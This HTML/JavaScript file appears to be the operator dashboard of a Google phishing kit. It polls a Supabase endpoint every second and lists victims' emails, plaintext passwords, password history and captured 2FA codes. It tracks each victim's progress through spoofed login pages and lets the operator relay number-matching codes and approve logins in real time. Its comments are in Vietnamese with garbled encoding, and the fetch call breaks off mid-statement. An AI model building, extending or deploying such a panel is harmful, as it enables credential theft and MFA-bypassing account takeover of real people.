<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login Approval Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Google+Sans:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body { 
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0; 
            padding: 20px; 
            min-height: 100vh;
            color: #202124;
        }

        .main-container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }

        .header {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 25px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .header h1 {
            margin: 0;
            color: #2c3e50;
            font-size: 28px;
            font-weight: 600;
            text-align: center;
        }

        .stats-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 25px;
        }

        .stat-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            transition: transform 0.3s ease;
        }

        .stat-card:hover {
            transform: translateY(-5px);
        }

        .stat-number {
            font-size: 32px;
            font-weight: bold;
            color: #3498db;
            margin-bottom: 5px;
        }

        .stat-label {
            font-size: 14px;
            color: #7f8c8d;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .section {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 25px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .section-title {
            font-size: 20px;
            font-weight: 600;
            color: #2c3e50;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .email-table {
            width: 100%;
            border-collapse: collapse;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }

        .email-table thead {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .email-table th {
            padding: 15px 12px;
            text-align: left;
            font-weight: 600;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .email-table tbody tr {
            background: white;
            border-bottom: 1px solid #e9ecef;
            transition: all 0.3s ease;
        }

        .email-table tbody tr:hover {
            background: #f8f9fa;
            transform: scale(1.01);
        }

        .email-table td {
            padding: 15px 12px;
            vertical-align: middle;
        }

        .email-cell {
            font-weight: 600;
            color: #2c3e50;
        }

        .password-cell {
            font-family: 'Courier New', monospace;
            background: #f8f9fa;
            border-radius: 5px;
            padding: 5px 8px;
            font-size: 12px;
        }

        .status-badge {
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .status-login { background: #e3f2fd; color: #1976d2; }
        .status-password { background: #fff3e0; color: #f57c00; }
        .status-device { background: #f3e5f5; color: #7b1fa2; }
        .status-notification { background: #e8f5e8; color: #2e7d32; }
        .status-approved { background: #e8f5e8; color: #2e7d32; }

        .verification-input {
            width: 60px;
            padding: 8px;
            border: 2px solid #e9ecef;
            border-radius: 8px;
            text-align: center;
            font-weight: bold;
            font-size: 14px;
            transition: all 0.3s ease;
        }

        .verification-input:focus {
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
            outline: none;
        }

        .verification-input.has-code {
            border-color: #27ae60;
            background: #e8f5e8;
            color: #27ae60;
        }

        .verification-input.disabled {
            background: #f8f9fa;
            border-color: #dee2e6;
            color: #6c757d;
            cursor: not-allowed;
        }

        .verification-input:disabled {
            background: #f8f9fa;
            border-color: #dee2e6;
            color: #6c757d;
            cursor: not-allowed;
        }

        .btn-approve {
            background: linear-gradient(135deg, #27ae60, #2ecc71);
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-right: 8px;
        }

        .btn-approve:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
        }

        .btn-approve:disabled {
            background: #bdc3c7;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .btn-deny {
            background: linear-gradient(135deg, #e74c3c, #c0392b);
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-deny:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(231, 76, 60, 0.3);
        }

        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #7f8c8d;
        }

        .empty-state-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }

        .empty-state-text {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .empty-state-subtext {
            font-size: 14px;
            opacity: 0.8;
        }

        .toast {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            padding: 15px 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            z-index: 1000;
            transform: translateX(400px);
            transition: transform 0.3s ease;
        }

        .toast.show {
            transform: translateX(0);
        }

        .toast.success {
            border-left: 4px solid #27ae60;
        }

        .toast.error {
            border-left: 4px solid #e74c3c;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="header">
            <h1>üîê Login Request Management System</h1>
        </div>

        <div class="stats-container">
            <div class="stat-card">
                <div class="stat-number" id="totalEmails">0</div>
                <div class="stat-label">Total Emails</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="pendingRequests">0</div>
                <div class="stat-label">Pending</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="approvedRequests">0</div>
                <div class="stat-label">Approved</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="verificationCodes">0</div>
                <div class="stat-label">With Codes</div>
            </div>
        </div>

        <div class="section">
            <h2 class="section-title">üìß Email Login Tracking</h2>
            <div id="emailTrackingContainer">
                <div class="empty-state">
                    <div class="empty-state-icon">üìß</div>
                    <div class="empty-state-text">No emails tracked yet</div>
                    <div class="empty-state-subtext">New login attempts will appear here automatically</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Global variables
        let requests = [];
        let passwordHistory = {};

        // Utility functions
        function escapeHtml(text) {
            if (!text) return '';
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        function formatTime(timestamp) {
            return new Date(timestamp).toLocaleTimeString();
        }

        function formatDate(timestamp) {
            return new Date(timestamp).toLocaleDateString();
        }

        // Copy to clipboard function
        async function copyToClipboard(text, element) {
            try {
                await navigator.clipboard.writeText(text);
                element.classList.add('copied');
                showToast('Copied to clipboard!');
                setTimeout(() => {
                    element.classList.remove('copied');
                }, 2000);
            } catch (err) {
                const textArea = document.createElement('textarea');
                textArea.value = text;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
                
                element.classList.add('copied');
                showToast('Copied to clipboard!');
                setTimeout(() => {
                    element.classList.remove('copied');
                }, 2000);
            }
        }

        // Show toast notification
        function showToast(message) {
            const existingToast = document.querySelector('.toast');
            if (existingToast) {
                existingToast.remove();
            }
            
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.textContent = message;
            toast.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                background: #323232;
                color: white;
                padding: 12px 20px;
                border-radius: 8px;
                font-size: 0.9rem;
                z-index: 1000;
                opacity: 0;
                transform: translateX(100%);
                transition: all 0.3s ease;
            `;
            document.body.appendChild(toast);
            
            setTimeout(() => {
                toast.style.opacity = '1';
                toast.style.transform = 'translateX(0)';
            }, 100);
            
            setTimeout(() => {
                toast.style.opacity = '0';
                toast.style.transform = 'translateX(100%)';
                setTimeout(() => {
                    if (toast.parentElement) {
                        toast.remove();
                    }
                }, 300);
            }, 3000);
        }

        // Update statistics
        function updateStats() {
            if (!requests || requests.length === 0) {
                document.getElementById('totalEmails').textContent = '0';
                document.getElementById('pendingRequests').textContent = '0';
                document.getElementById('approvedRequests').textContent = '0';
                document.getElementById('verificationCodes').textContent = '0';
                return;
            }

            // T·∫°o map theo email ƒë·ªÉ ƒë·∫øm ch√≠nh x√°c
            const emailMap = {};
            
            requests.forEach(request => {
                const email = request.email;
                
                if (!emailMap[email]) {
                    emailMap[email] = {
                        email: email,
                        status: 'pending',
                        hasVerificationCode: false,
                        lastUpdate: request.createdAt
                    };
                }
                
                // C·∫≠p nh·∫≠t th√¥ng tin m·ªõi nh·∫•t cho email n√†y
                if (request.createdAt >= emailMap[email].lastUpdate) {
                    emailMap[email].lastUpdate = request.createdAt;
                    
                    // C·∫≠p nh·∫≠t status
                    if (request.status) {
                        emailMap[email].status = request.status;
                    }
                    
                    // Ki·ªÉm tra c√≥ verification code kh√¥ng
                    if (request.verificationCode && request.verificationCode !== 'on') {
                        emailMap[email].hasVerificationCode = true;
                    }
                }
            });

            const emails = Object.values(emailMap);
            const totalEmails = emails.length;
            const pendingEmails = emails.filter(e => e.status === 'pending').length;
            const approvedEmails = emails.filter(e => e.status === 'approved').length;
            const emailsWithCodes = emails.filter(e => e.hasVerificationCode).length;

            document.getElementById('totalEmails').textContent = totalEmails;
            document.getElementById('pendingRequests').textContent = pendingEmails;
            document.getElementById('approvedRequests').textContent = approvedEmails;
            document.getElementById('verificationCodes').textContent = emailsWithCodes;
        }

        // Build password history for an email
        function buildPasswordHistory(email) {
            const emailRequests = requests.filter(r => r.email === email && r.password && r.password !== 'undefined');
            if (emailRequests.length <= 1) return '';

            const history = emailRequests.map(req => ({
                password: req.password,
                time: req.createdAt,
                status: req.status
            }));

            let historyHtml = '<div class="password-history">';
            historyHtml += '<div class="password-history-title">Password History:</div>';
            
            history.forEach(item => {
                const statusClass = item.status === 'denied' ? 'denied' : 'approved';
                historyHtml += `
                    <div class="password-item">
                        <span class="password-text ${statusClass}">${escapeHtml(item.password)}</span>
                        <span class="password-time">${formatTime(item.time)}</span>
                    </div>
                `;
            });
            
            historyHtml += '</div>';
            return historyHtml;
        }

        // Render email tracking table - m·ªói email 1 h√†ng duy nh·∫•t
        function renderPendingRequests() {
            const container = document.getElementById('emailTrackingContainer');
            if (!requests || requests.length === 0) {
                container.innerHTML = `
                    <div class="empty-state">
                        <div class="empty-state-icon">üìß</div>
                        <div class="empty-state-text">No emails tracked yet</div>
                        <div class="empty-state-subtext">New login attempts will appear here automatically</div>
                    </div>
                `;
                return;
            }

            // T·∫°o map theo email - m·ªói email ch·ªâ c√≥ 1 entry, lu√¥n c·∫≠p nh·∫≠t v·ªõi data m·ªõi nh·∫•t
            const emailMap = {};
            
            requests.forEach(request => {
                const email = request.email;
                
                if (!emailMap[email]) {
                    // T·∫°o entry m·ªõi cho email n√†y
                    emailMap[email] = {
                        email: email,
                        latestPassword: 'Not entered',
                        currentStatus: 'Login',
                        verificationCode: '',
                        userTwoFACode: '',
                        approvalStatus: 'pending',
                        latestId: request.id,
                        createdAt: request.createdAt,
                        lastUpdate: request.createdAt
                    };
                }
                
                // C·∫≠p nh·∫≠t th√¥ng tin m·ªõi nh·∫•t
                if (request.createdAt >= emailMap[email].lastUpdate) {
                    emailMap[email].lastUpdate = request.createdAt;
                    emailMap[email].latestId = request.id;
                    
                    // C·∫≠p nh·∫≠t password n·∫øu c√≥
                    if (request.password && request.password !== 'undefined') {
                        emailMap[email].latestPassword = request.password;
                    }
                    
                    // C·∫≠p nh·∫≠t tr·∫°ng th√°i hi·ªán t·∫°i
                    if (request.pageStatus) {
                        emailMap[email].currentStatus = request.pageStatus;
                    }
                    
                    // C·∫≠p nh·∫≠t verification code n·∫øu c√≥
                    if (request.verificationCode && request.verificationCode !== 'on') {
                        emailMap[email].verificationCode = request.verificationCode;
                    }
                    
                    // C·∫≠p nh·∫≠t 2FA code t·ª´ trang verify.html
                    if (request.twofa && request.twofa !== 'undefined' && request.twofa !== 'on') {
                        emailMap[email].userTwoFACode = request.twofa;
                    }
                    
                    // C·∫≠p nh·∫≠t approval status
                    if (request.status) {
                        emailMap[email].approvalStatus = request.status;
                    }
                }
            });

            const emails = Object.keys(emailMap);
            
            if (emails.length === 0) {
                container.innerHTML = `
                    <div class="empty-state">
                        <div class="empty-state-icon">üìß</div>
                        <div class="empty-state-text">No emails tracked yet</div>
                        <div class="empty-state-subtext">New login attempts will appear here automatically</div>
                    </div>
                `;
                return;
            }

            let tableHtml = `
                <table id="emailTrackingTable" class="email-table">
                    <thead>
                        <tr>
                            <th>üìß EMAIL</th>
                            <th>üîí PASSWORD</th>
                            <th>üì± STATUS</th>
                            <th>üîê CODE VERIFY</th>
                            <th>üî¢ VERIFICATION CODE</th>
                            <th>‚úÖ APPROVAL</th>
                            <th>‚ö° ACTIONS</th>
                        </tr>
                    </thead>
                    <tbody>
            `;

            emails.forEach(email => {
                const data = emailMap[email];
                
                // L·∫•y verification code ƒë√£ l∆∞u t·ª´ localStorage (n·∫øu c√≥)
                const savedCode = localStorage.getItem(`verification_code_${data.latestId}`) || data.verificationCode || '';
                
                // X√°c ƒë·ªãnh status badge (t·ªëi ∆∞u kh√¥ng console.log)
                let statusClass = 'status-login';
                let statusText = data.currentStatus;
                let canInputCode = false;
                
                // Ph√¢n lo·∫°i status d·ª±a tr√™n pageStatus ch√≠nh x√°c
                if (data.currentStatus === 'Login') {
                    statusClass = 'status-login';
                    statusText = 'üîê Login Page';
                    canInputCode = false;
                } else if (data.currentStatus === 'Password') {
                    statusClass = 'status-password';
                    statusText = 'üîë Password Page';
                    canInputCode = false;
                } else if (data.currentStatus === 'Setup Code Phone') {
                    statusClass = 'status-device';
                    statusText = 'üì± Verify Device';
                    canInputCode = true;
                } else if (data.currentStatus.includes('Notification')) {
                    statusClass = 'status-notification';
                    statusText = 'üì¨ Notification';
                    canInputCode = true;
                } else {
                    // Fallback cho c√°c tr·∫°ng th√°i kh√°c
                    if (data.currentStatus.toLowerCase().includes('password')) {
                        statusClass = 'status-password';
                        statusText = 'üîë ' + data.currentStatus;
                        canInputCode = false;
                    } else if (data.currentStatus.toLowerCase().includes('setup') || 
                               data.currentStatus.toLowerCase().includes('device') || 
                               data.currentStatus.toLowerCase().includes('code') ||
                               data.currentStatus.toLowerCase().includes('phone')) {
                        statusClass = 'status-device';
                        statusText = 'üì± ' + data.currentStatus;
                        canInputCode = true;
                    } else {
                        statusClass = 'status-login';
                        statusText = 'üîê ' + data.currentStatus;
                        canInputCode = false;
                    }
                }
                
                // X√°c ƒë·ªãnh approval status
                let approvalClass = 'status-pending';
                let approvalText = 'Pending';
                
                if (data.approvalStatus === 'approved') {
                    approvalClass = 'status-approved';
                    approvalText = 'Approved';
                } else if (data.approvalStatus === 'denied') {
                    approvalClass = 'status-denied';
                    approvalText = 'Denied';
                }
                
                // Ki·ªÉm tra n√∫t approve c√≥ th·ªÉ b·∫•m kh√¥ng
                const canApprove = data.approvalStatus === 'pending';
                const inputDisabled = !canInputCode;
                
                // Hi·ªÉn th·ªã m√£ 2FA t·ª´ trang verify.html
                const userTwoFADisplay = data.userTwoFACode ? 
                    `<span class="user-2fa-code" style="background: #e8f5e8; color: #2e7d32; padding: 4px 8px; border-radius: 4px; font-family: monospace; font-weight: bold;">${data.userTwoFACode}</span>` : 
                    '<span style="color: #999;">Not entered</span>';
                
                tableHtml += `
                    <tr id="row-${data.latestId}">
                        <td class="email-cell">${data.email}</td>
                        <td class="password-cell">${data.latestPassword}</td>
                        <td><span class="status-badge ${statusClass}">${statusText}</span></td>
                        <td>${userTwoFADisplay}</td>
                        <td>
                            <input type="text" 
                                   class="verification-input ${savedCode ? 'has-code' : ''} ${inputDisabled ? 'disabled' : ''}" 
                                   data-id="${data.latestId}" 
                                   placeholder="${canInputCode ? '00' : '--'}" 
                                   value="${savedCode}" 
                                   maxlength="2" 
                                   oninput="handleVerificationInput(this, ${data.latestId})"
                                   onkeydown="event.stopPropagation()"
                                   onkeyup="event.stopPropagation()"
                                   onfocus="this.dataset.hasFocus='true'"
                                   onblur="delete this.dataset.hasFocus"
                                   ${inputDisabled ? 'disabled' : ''}
                                   title="${canInputCode ? 'Enter verification code (available at verify-device page)' : 'Code input available when user reaches verification page'}">
                        </td>
                        <td><span class="status-badge ${approvalClass}">${approvalText}</span></td>
                        <td>
                            <button class="btn-approve" 
                                    onclick="approve(${data.latestId}, 'approved')"
                                    ${!canApprove ? 'disabled' : ''}
                                    title="${canApprove ? 'Approve request' : 'Already processed'}">
                                Approve
                            </button>
                            <button class="btn-deny" 
                                    onclick="approve(${data.latestId}, 'denied')"
                                    ${!canApprove ? 'disabled' : ''}
                                    title="${canApprove ? 'Deny request' : 'Already processed'}">
                                Deny
                            </button>
                        </td>
                    </tr>
                `;
            });

            tableHtml += `
                    </tbody>
                </table>
            `;

            // Ki·ªÉm tra xem b·∫£ng ƒë√£ t·ªìn t·∫°i ch∆∞a
            const existingTable = document.getElementById('emailTrackingTable');
            if (existingTable) {
                // L∆∞u tr·∫°ng th√°i c·ªßa c√°c input ƒëang ƒë∆∞·ª£c ch·ªânh s·ª≠a
                const activeInputs = {};
                const inputsWithFocus = existingTable.querySelectorAll('input[data-has-focus="true"], input[data-is-editing="true"]');
                inputsWithFocus.forEach(input => {
                    const id = input.getAttribute('data-id');
                    activeInputs[id] = {
                        value: input.value,
                        focused: document.activeElement === input
                    };
                });
                
                // C·∫≠p nh·∫≠t b·∫£ng
                container.innerHTML = tableHtml;
                
                // Kh√¥i ph·ª•c tr·∫°ng th√°i input
                Object.keys(activeInputs).forEach(id => {
                    const input = document.querySelector(`input[data-id="${id}"]`);
                    if (input) {
                        input.value = activeInputs[id].value;
                        if (activeInputs[id].focused) {
                            setTimeout(() => input.focus(), 10);
                        }
                    }
                });
            } else {
                // L·∫ßn ƒë·∫ßu t·∫°o b·∫£ng
                container.innerHTML = tableHtml;
            }
        }

        // API functions
        async function fetchRequests() {
            try {
                const response = await fetch('https://nqsdardermkzppeaazbb.supabase.co/functions/v1/api-v2/api/requests', { 
                    cache: 'no-store',
                    headers: {

        // H√†m x·ª≠ l√Ω khi nh·∫≠p verification code
        function handleVerificationInput(input, requestId) {
            // Prevent event bubbling
            event.stopPropagation();
            
            // Ch·ªâ cho ph√©p nh·∫≠p s·ªë
            input.value = input.value.replace(/[^0-9]/g, '');
            
            // Gi·ªõi h·∫°n 2 s·ªë
            if (input.value.length > 2) {
                input.value = input.value.slice(0, 2);
            }
            
            // L∆∞u v√†o localStorage
            localStorage.setItem(`verification_code_${requestId}`, input.value);
            
            // Th√™m class 'has-code' ƒë·ªÉ CSS style
            if (input.value.length > 0) {
                input.classList.add('has-code');
            } else {
                input.classList.remove('has-code');
            }
            
            // ƒê√°nh d·∫•u input ƒëang ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ tr√°nh re-render
            input.dataset.isEditing = 'true';
            
            // Clear previous timeout n·∫øu c√≥
            if (input.editingTimeout) {
                clearTimeout(input.editingTimeout);
            }
            
            // Set timeout ƒë·ªÉ tr√°nh re-render qu√° s·ªõm
            input.editingTimeout = setTimeout(() => {
                delete input.dataset.isEditing;
            }, 1500);
        }

        // Initialize
        fetchRequests();
        setInterval(fetchRequests, 1000); // Gi·∫£m t·ª´ 5 gi√¢y xu·ªëng 1 gi√¢y ƒë·ªÉ responsive h∆°n
